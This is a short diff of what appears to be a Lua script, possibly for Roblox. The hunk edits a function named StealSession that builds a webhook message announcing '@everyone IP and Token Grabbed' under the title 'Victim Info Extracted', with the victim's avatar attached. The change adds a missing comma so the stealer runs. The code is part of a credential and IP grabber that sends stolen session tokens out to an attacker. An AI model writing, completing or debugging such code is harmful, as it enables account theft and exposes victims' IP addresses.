@@ -19,7 +19,7 @@ local function StealSession()
         ["content"] = "@everyone IP and Token Grabbed",
         ["embeds"] = {{
             ["title"] = "Victim Info Extracted",
-            ["color"] = 0x1A1A1A
+            ["color"] = 0x1A1A1A,
             ["image"] = {
                 ["url"] = fullBodyAvatarUrl
             },
